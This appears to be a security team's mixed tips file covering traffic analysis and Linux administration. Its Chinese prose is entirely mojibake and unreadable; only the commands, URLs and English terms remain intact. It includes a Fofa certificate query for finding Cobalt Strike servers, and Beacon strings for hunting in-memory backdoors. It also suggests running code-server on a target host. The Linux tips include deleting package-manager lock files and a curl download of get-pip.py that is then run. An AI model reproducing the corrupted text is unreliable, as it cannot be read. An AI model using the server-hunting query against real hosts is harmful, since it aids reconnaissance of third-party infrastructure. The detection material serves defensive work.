æµé‡åˆ†æé™¤äº† wireshark ç”¨ç§‘æ¥çš„å·¥å…·è¿›è¡Œåˆ†æä¹Ÿæ˜¯ä¸ªä¸é”™çš„é€‰æ‹©ï¼Œæœ‰æ—¶å€™åš ctf çš„åˆ†æé¢˜ï¼Œç›´æ¥ç”¨ç§‘æ¥å·¥å…·æ‰“å¼€å°±å¯ä»¥å‘ç°å¼‚å¸¸åŒ…ï¼Œè¿˜æ˜¯æŒºæœ‰å¸®åŠ©çš„

---

CobaltStrike çš„ Fofa è¯­æ³•
```
cert="73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F"
```

---

çº¢é˜Ÿå¸¸ç”¨çš„æ‰«æå™¨ç‰¹å¾
- https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/http/RedTeam.txt

---

"Beacon.dll"ã€"beacon.x64.dll" å’Œ "ReflectiveLoader" é»˜è®¤æ˜¯ CS Beacon çš„ç¡¬ç¼–ç ç‰¹å¾ã€‚å½“å¯»æ‰¾å†…å­˜ä¸­çš„åé—¨æ—¶ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹

![](./assets/img/2.png)

---

# Linux

vultr çš„ Fedora 35 ç‰ˆæœ¬ vps é»˜è®¤æ—  dns è®¾ç½®,æˆ‘æ— æ³•ç†è§£ ğŸ¤¡
```
echo "nameserver 8.8.8.8" > /etc/resolv.conf
systemctl restart systemd-resolved
```

---

è¿œç¨‹ä¿®æ”¹æ–‡ä»¶æœ‰æ—¶å€™è¿˜æ˜¯å›¾å½¢åŒ–æ–¹ä¾¿äº›ï¼Œå¦‚æœå–œæ¬¢ vscode è¿™ç§ç¼–è¾‘å™¨,å¯ä»¥è¯•è¯• https://github.com/cdr/code-server ,åœ¨ç›®æ ‡ä¸Šé…ç½®ä¸€ä¸ªè¿œç¨‹çš„ vscode æœåŠ¡å™¨,åšè°ƒè¯•ã€è·‘è„šæœ¬éƒ½å¾ˆæ–¹ä¾¿

---

æ¨èä¸€ä¸ªå¾ˆæ–¹ä¾¿çš„ linux æ–‡ä»¶ç®¡ç†å·¥å…· ranger, å…·æœ‰ Vim å¼çš„æ“ä½œæ–¹å¼.

```bash
apt install ranger && pip install ranger-fm
ranger

# ä½¿ç”¨ h,j,k,l æ¥è¿›è¡Œå…‰æ ‡çš„ç§»åŠ¨, æ¥ç©¿è¶Šåœ¨ä¸åŒçš„æ–‡ä»¶å¤¹ä¸­
# q é€€å‡º
# S æ¥è¿›è¡Œå½“å‰å…‰æ ‡æ‰€åœ¨çš„æ–‡ä»¶å¤¹ä¸­ exit å‘½ä»¤é‡æ–°å›åˆ° ranger ç¨‹åºå½“ä¸­å»
```

---

å½“è¿è¡Œä¸€ä¸ªç¨‹åºå‘ç°ç¼ºå°‘åº“æ—¶,å¯ä»¥ä½¿ç”¨ apt-file è¿›è¡Œæœç´¢ï¼Œç„¶åå®‰è£…å¯¹åº”çš„è½¯ä»¶åŒ…
```bash
apt install apt-file
apt-file update
apt-file search <xxx>
apt install <xxx>
```

> æ¥è‡ªé¡¹ç›® : [firmianay/Tips-for-Geek](https://github.com/firmianay/Tips-for-Geek)

---

ç”¨äºæ–‡æœ¬å¤„ç†çš„å‡ ä¸ªå·¥å…·
- tr : å¤šåŠŸèƒ½å¤„ç†
- https://github.com/tomnomnom/anew : è‡ªåŠ¨å»é‡
- jq : json æ ¼å¼åŒ–
- expand/unexpand : ç©ºæ ¼å’Œ TAB è½¬æ¢

---

å‘½ä»¤è¡Œä¸‹æˆªå›¾çš„ä¸€ç§ä¸é”™çš„æ–¹å¼
- asciinema

---

ç¥å™¨çº§å·¥å…·,Linux ä¸‹çš„ everything
- https://github.com/junegunn/fzf

![](./assets/img/6.png)

---

æ¨èä¸€ä¸ª linux å°å·¥å…· trash-cli ç”¨äºç§»åŠ¨æ–‡ä»¶åˆ°å›æ”¶ç«™ï¼ŒåŒæ—¶ä¼šè®°å½•æ–‡ä»¶çš„åŸåœ°å€ã€åˆ é™¤æ—¥æœŸå’Œæƒé™ã€‚trash-cli å’Œ KDEã€GNOMEã€XFCE ä½¿ç”¨åŒä¸€ä¸ªå›æ”¶ç«™ï¼Œä½ å¯ä»¥åœ¨å‘½ä»¤è¡Œæˆ–è„šæœ¬è¿è¡Œ trash-cliã€‚ä¸€å®šç¨‹åº¦ä¸Šå¯ä»¥ä»£æ›¿ rm
- åœ°å€:https://github.com/andreafrancia/trash-cli/blob/master/README_zh-CN.rst

---

ä¸€ä¸ªæ¢é’ˆå·¥å…·ï¼Œå¯ç”¨äºå®æ—¶ç›‘æµ‹æœåŠ¡å™¨è¿è¡ŒçŠ¶å†µ
- åœ°å€:https://github.com/naiba/nezha

---

linux ä½¿ç”¨è¿‡ç¨‹ä¸­ç»å¸¸å‡ºç°å®‰è£…è½¯ä»¶åŒ…å¤±è´¥çš„é—®é¢˜,å¾ˆå¤šæƒ…å†µæ˜¯é‡åˆ°äº†é”,å¯ä»¥ç›´æ¥åˆ é™¤(è¿ç»´å…„å¼Ÿä»¬,ç”Ÿäº§ç¯å¢ƒä¸‹ä¸è¦ç”¨å•ŠğŸ¤£ğŸ¤£ğŸ¤£)
- debianç³»
    æŠ¥é”™ï¼šæ— æ³•è·å¾—é” /var/lib/apt/lists/lock - open (11: èµ„æºæš‚æ—¶ä¸å¯ç”¨)
    ```bash
    rm -rf /var/cache/apt/archives/lock
    rm -rf /var/lib/dpkg/lock-frontend
    rm -rf /var/lib/dpkg/lock
    rm /var/lib/dpkg/lock
    rm /var/lib/apt/lists/lock
    ```
- redhatç³»
    æŠ¥é”™ï¼š/var/run/yum.pid å·²è¢«é”å®š,PID ä¸º xxxx çš„å¦ä¸€ä¸ªç¨‹åºæ­£åœ¨è¿è¡Œ.
    ```bash
    rm -f /var/run/yum.pid 2> /dev/null
    ```
- ç‰¹ç«‹ç‹¬è¡Œçš„ Fedora
    æŠ¥é”™ï¼šWaiting for process with pid <xxx> to finish.
    ```bash
    rm -f /var/cache/dnf/metadata_lock.pid 2> /dev/null
    ```

---

åœ¨ linux ä¸­å®‰è£…ä¸€äº›ç»„ä»¶çš„ä¾èµ–æ—¶ä¼šæœ‰æ¯”å¦‚ python-dev å’Œ  python-devel çš„åŒºåˆ«,devel æˆ– dev åŒ…ä¸»è¦æ˜¯ä¾›å¼€å‘ç”¨ï¼Œè¿™ä»£è¡¨ä¸åŒçš„å‘è¡Œç‰ˆæœ¬ï¼Œredhat ç³»æ˜¯ devel ï¼Œdebian ç³»æ˜¯ dev

---

ä¿®æ”¹ Linux çš„ DNS ä¸€ç›´æ˜¯ä¸€ä¸ªé—®é¢˜ï¼Œæ¯æ¬¡å¼€æœº dns éƒ½ä¼šé‡ç½®ï¼Œdebian ä¸‹å¯ä»¥ä½¿ç”¨ dns ç®¡ç†å·¥å…·ä¸€åŠ³æ°¸é€¸çš„è§£å†³
- å®‰è£…
    ```bash
    apt-get install -y resolvconf
    ```
- é…ç½®
    ```bash
    echo "nameserver 223.5.5.5" > /etc/resolvconf/resolv.conf.d/head
    ```
- æ›´æ–°
    ```bash
    resolvconf -u
    ```
- è‹¥éœ€è¦æ›´æ”¹ DNS,è¯·ä¿®æ”¹ `/etc/resolvconf/resolv.conf.d/head` æ–‡ä»¶

---

å¦‚æœåœ¨ red hat ç³»å‘è¡Œç‰ˆä¸­éœ€è¦è£…å¼€å‘å·¥å…·,å»ºè®®å®‰è£… Development Tools ï¼Œå¯ä»¥å°†å¸¸ç”¨è½¯ä»¶ï¼Œä¸€æ¬¡æ€§è£…å¥½
- å®‰è£…
    ```bash
    yum groupinstall -y "Development Tools"
    ```

---

åˆ†äº«å‡ ä¸ªlinuxæ€§èƒ½è°ƒä¼˜çš„æŠ€å·§
```bash
sync    # sync å‘½ä»¤åšåŒæ­¥,ä»¥ç¡®ä¿æ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§,å°†æ‰€æœ‰æœªå†™çš„ç³»ç»Ÿç¼“å†²åŒºå†™åˆ°ç£ç›˜ä¸­,åŒ…å«å·²ä¿®æ”¹çš„ i-nodeã€å·²å»¶çš„å— I/O å’Œå†™æ˜ å°„æ–‡ä»¶.å¦åˆ™åœ¨é‡Šæ”¾ç¼“å­˜çš„è¿‡ç¨‹ä¸­,å¯èƒ½ä¼šä¸¢å¤±æœªä¿å­˜çš„æ–‡ä»¶.
echo 1 > /proc/sys/vm/drop_caches   # æ¸…ç† pagecache(é¡µé¢ç¼“å­˜)
echo 2 > /proc/sys/vm/drop_caches   # æ¸…ç† dentries(ç›®å½•ç¼“å­˜)å’Œinodes
echo 3 > /proc/sys/vm/drop_caches   # æ¸…ç† pagecacheã€dentries å’Œ inodes
sync

# å–æ¶ˆå¼€å¯æ–‡ä»¶æ•°é™åˆ¶
ulimit -n 65535

# ä¼˜åŒ–å†…å­˜
echo 128 > /proc/sys/vm/nr_hugepages        # é»˜è®¤ä¸º0
sysctl -w vm.nr_hugepages=128
```

---

æœ€è¿‘åœ¨ linux æ­å»º vpn æœåŠ¡çš„æ—¶å€™é‡åˆ°æ—¶é—´å’Œæ—¶åŒºä¸åŒæ­¥çš„æƒ…å†µï¼Œåˆ†äº«ä¸‹è§£å†³æ–¹æ¡ˆ

æŸ¥çœ‹å½“å‰æ—¶åŒº
```bash
timedatectl
```

ä¿®æ”¹å½“å‰æ—¶åŒºï¼š
```bash
timedatectl set-timezone Asia/Shanghai
# æˆ–
cp  /usr/share/zoneinfo/Asia/Shanghai  /etc/localtime
```

---

ç”±äº python å®˜æ–¹åœæ­¢äº†å¯¹ python2 çš„ç»´æŠ¤ï¼Œä»¥åå¤§éƒ¨åˆ†å’Œ pip2 æœ‰å…³çš„æ“ä½œéƒ½ä¼šæŠ¥ä¸‹é¢è¿™ä¸ªé”™ï¼Œæˆ‘é¢„ä¼°ä¸€ä¸‹ï¼Œè¿™ä¸ªåº”è¯¥æ˜¯ä»¥åæˆ‘ä»¬é‡åˆ°æœ€å¸¸è§çš„é—®é¢˜ä¹‹ä¸€, è§£å†³æ–¹æ¡ˆå¾ˆç®€å•, å®‰è£…æŒ‡å®šç‰ˆæœ¬çš„ pip2 å³å¯

![](./assets/img/3.png)

```
curl https://bootstrap.pypa.io/2.7/get-pip.py --output get-pip.py
python get-pip.py
```

---

Python 2 åœ¨ Ubuntu 20 ä¸Šä¸å­˜åœ¨ï¼Œä½†æ˜¯æœ‰æ—¶å€™è¿˜æ˜¯éœ€è¦çš„ã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤å®‰è£…
```bash
apt-get install python-is-python2
```

---

> create by ffffffff0x
